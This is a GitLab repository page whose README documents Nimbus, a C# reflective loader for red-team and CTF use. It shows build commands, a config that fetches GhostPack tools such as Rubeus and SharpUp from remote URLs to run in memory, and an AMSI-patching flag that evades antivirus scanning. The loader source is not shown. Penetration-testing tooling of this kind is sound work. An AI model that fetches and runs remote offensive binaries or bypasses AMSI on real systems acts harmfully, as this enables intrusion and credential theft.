# https://gitlab.com/gerbot/nimbus

[Snippets](https://gitlab.com/explore/snippets) [Groups](https://gitlab.com/explore/groups) [Projects](https://gitlab.com/explore/projects)

main


Select Git revision


- Selected


- main
default
protected


1 result


Find file


Code


- Clone with SSH
- Clone with HTTPS
Open with

- Visual Studio Code
[SSH](vscode://vscode.git/clone?url=git%40gitlab.com%3Agerbot%2Fnimbus.git) [HTTPS](vscode://vscode.git/clone?url=https%3A%2F%2Fgitlab.com%2Fgerbot%2Fnimbus.git)

- IntelliJ IDEA
[SSH](jetbrains://idea/checkout/git?idea.required.plugins.id=Git4Idea&checkout.repo=git%40gitlab.com%3Agerbot%2Fnimbus.git) [HTTPS](jetbrains://idea/checkout/git?idea.required.plugins.id=Git4Idea&checkout.repo=https%3A%2F%2Fgitlab.com%2Fgerbot%2Fnimbus.git)
Download source code

- [zip](https://gitlab.com/gerbot/nimbus/-/archive/main/nimbus-main.zip?ref_type=heads) [tar.gz](https://gitlab.com/gerbot/nimbus/-/archive/main/nimbus-main.tar.gz?ref_type=heads) [tar.bz2](https://gitlab.com/gerbot/nimbus/-/archive/main/nimbus-main.tar.bz2?ref_type=heads) [tar](https://gitlab.com/gerbot/nimbus/-/archive/main/nimbus-main.tar?ref_type=heads)

Your workspaces


A workspace is a virtual sandbox environment for your code in GitLab.


No agents available to create workspaces. Please consult [Workspaces documentation](https://gitlab.com/help/user/workspace/workspaces_troubleshooting.html) for troubleshooting.

Actions


Copy permalink `y`

[![GerhardBotha97's avatar](https://secure.gravatar.com/avatar/049736482337a1982d91a324efec97c6866908774f16e98f96e7dce4056aee44?s=80&d=identicon)](https://gitlab.com/gerbot)

[Changes to be committed:](https://gitlab.com/gerbot/nimbus/-/commit/3346e8c2adfc45e7ce1212f743f5a2e449e224b6)

[GerhardBotha97](https://gitlab.com/gerbot) authored Sep 8, 2024

```
	modified:   README.md
```

3346e8c2

[History](https://gitlab.com/gerbot/nimbus/-/commits/main?ref_type=HEADS)

[![GerhardBotha97's avatar](https://secure.gravatar.com/avatar/049736482337a1982d91a324efec97c6866908774f16e98f96e7dce4056aee44?s=80&d=identicon)](https://gitlab.com/gerbot)[3346e8c2](https://gitlab.com/gerbot/nimbus/-/commit/3346e8c2adfc45e7ce1212f743f5a2e449e224b6) Sep 8, 2024

[History](https://gitlab.com/gerbot/nimbus/-/commits/main?ref_type=HEADS)

| Name | Last commit | Last update |
| --- | --- | --- |
| [Binaries](https://gitlab.com/gerbot/nimbus/-/tree/main/Binaries?ref_type=heads "Binaries") | Loading | Loading |
| [Config.cs](https://gitlab.com/gerbot/nimbus/-/blob/main/Config.cs?ref_type=heads "Config.cs") | Loading | Loading |
| [LICENSE](https://gitlab.com/gerbot/nimbus/-/blob/main/LICENSE?ref_type=heads "LICENSE") | Loading | Loading |
| [Newtonsoft.Json.dll](https://gitlab.com/gerbot/nimbus/-/blob/main/Newtonsoft.Json.dll?ref_type=heads "Newtonsoft.Json.dll") | Loading | Loading |
| [Nimbus.cs](https://gitlab.com/gerbot/nimbus/-/blob/main/Nimbus.cs?ref_type=heads "Nimbus.cs") | Loading | Loading |
| [README.md](https://gitlab.com/gerbot/nimbus/-/blob/main/README.md?ref_type=heads "README.md") | Loading | Loading |
| [Utils.cs](https://gitlab.com/gerbot/nimbus/-/blob/main/Utils.cs?ref_type=heads "Utils.cs") | Loading | Loading |
| [nimbus.json](https://gitlab.com/gerbot/nimbus/-/blob/main/nimbus.json?ref_type=heads "nimbus.json") | Loading | Loading |

[**README.md**](https://gitlab.com/gerbot/nimbus/-/blob/main/README.md?ref_type=heads)

# Nimbus [Link to heading 'Nimbus'](https://gitlab.com/gerbot/nimbus\#nimbus)

#### A minimal C\# Reflective Loader for offensive security purposes. [Link to heading 'A minimal C\# Reflective Loader for offensive security purposes.'](https://gitlab.com/gerbot/nimbus\#a-minimal-c-reflective-loader-for-offensive-security-purposes)

* * *

### Features [Link to heading 'Features'](https://gitlab.com/gerbot/nimbus\#features)

- Run remote C# compiled executable in memory.
- CLI-Arg friendly.
- Use a config file for your favourite tools.
- Automate your processes with pipelines.
- Perfect for penetration tests and CTFs.

* * *

### Download [Link to heading 'Download'](https://gitlab.com/gerbot/nimbus\#download)

You can skip the first two step in the next section by downloading the binaries.

### Setup [Link to heading 'Setup'](https://gitlab.com/gerbot/nimbus\#setup)

1. Clone the repo

```plaintext
git clone https://gitlab.com/gerbot/nimbus.git
```

2. Build the project

```plaintext
# 64bit
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:Nimbus64.exe /reference:System.Web.Extensions.dll /reference:Newtonsoft.Json.dll Nimbus.cs Utils.cs Config.cs

# 32bit
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:Nimbus32.exe /reference:System.Web.Extensions.dll /reference:Newtonsoft.Json.dll Nimbus.cs Utils.cs Config.cs
```

3. Modify the `nimbus.json` file to add your favourite C#.Net executables. (Use the example provided as a reference)

```json
{
  "commands": {
    "--rubeus": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/dotnet%20v4.5%20compiled%20binaries/Rubeus.exe",
    "--seatbelt": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/dotnet%20v4.5%20compiled%20binaries/Seatbelt.exe",
    "--sharpup": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/dotnet%20v4.5%20compiled%20binaries/SharpUp.exe"
  },
  "pipelines": [\
    {\
      "name": "Local_Enumeration",\
      "tactics": [\
        {\
          "name": "Privesc Scanning",\
          "commands": [\
            {\
              "command": "--sharpup audit"\
            },\
            {\
              "command": "--seatbelt -group=all -full"\
            }\
          ]\
        }\
      ]\
    }\
  ]
}
```

4. Make sure Nimbus.exe and nimbus.json is in the same location.

5. Enjoy the buggy software.


* * *

### Usage [Link to heading 'Usage'](https://gitlab.com/gerbot/nimbus\#usage)

```plaintext
===== Nimbus Help Menu =====
Usage: Nimbus.exe [options] <command> [--args <arguments>]
Options
  --help                     Show this help message and exit.
  --load <URL>               Specify the URL of the executable to load and specify the arguments.
  --show                     Show all the commands in your config file.
  --amsi                     Enable AMSI patching (disabled by default).
  --pipeline <name>          Execute a predefined pipeline.
```

* * *

### Examples [Link to heading 'Examples'](https://gitlab.com/gerbot/nimbus\#examples)

To load a executable into memory with the associated flags.

```plaintext
Nimbus.exe --load https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/SharpUp.exe audit
```

Showing the options you have in your config file, along with the URLs:

```plaintext
Nimbus.exe --show
```

Running a command from the config file

```plaintext
Nimbus.exe --sharpup audit
```

Running pipelines can be done like so:

```plaintext
Nimbus.exe --pipeline <pipeline_name>
```

Optionally, if you want to bypass AMSI when doing it, you can make use of the `--amsi` flag.

```plaintext
Nimbus.exe --amsi --sharpup audit
```

* * *

### Credits [Link to heading 'Credits'](https://gitlab.com/gerbot/nimbus\#credits)

- Many binaries I used to test with, and are present in the config file are from this repo:
  - [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- The biggest source of inspiration:
  - [https://jfmaes-1.gitbook.io/reflection-workshop](https://jfmaes-1.gitbook.io/reflection-workshop) \*\*\*
  - [https://www.youtube.com/watch?v=E6LOQQiNjj0](https://www.youtube.com/watch?v=E6LOQQiNjj0)

Other sources I used for the idea and some inspiration:

- [https://offensivecraft.wordpress.com/2021/05/25/reflection-in-c-101/](https://offensivecraft.wordpress.com/2021/05/25/reflection-in-c-101/)

- [https://intezer.com/blog/incident-response/intro-to-malware-net-executable-file/](https://intezer.com/blog/incident-response/intro-to-malware-net-executable-file/)

- After breaking multiple keyboards trying to parse JSON, I have given up and used this package provided by the brilliant [https://github.com/JamesNK](https://github.com/JamesNK):
  - [https://www.nuget.org/packages/Newtonsoft.Json/](https://www.nuget.org/packages/Newtonsoft.Json/)
  - Downloaded the package and unzipped, then went to fetch the .dll in `lib\net40`

* * *

### Known Issues [Link to heading 'Known Issues'](https://gitlab.com/gerbot/nimbus\#known-issues)

- Works well on Windows 10 and 11. Not so well on Windows Server 2016-2022 versions tho.

* * *

### TODO [Link to heading 'TODO'](https://gitlab.com/gerbot/nimbus\#todo)

- Actually implement the `--config` command.
- Implement different AMSI Bypass methods.
- Implement different reflection methods.
- Make it run on the servers too.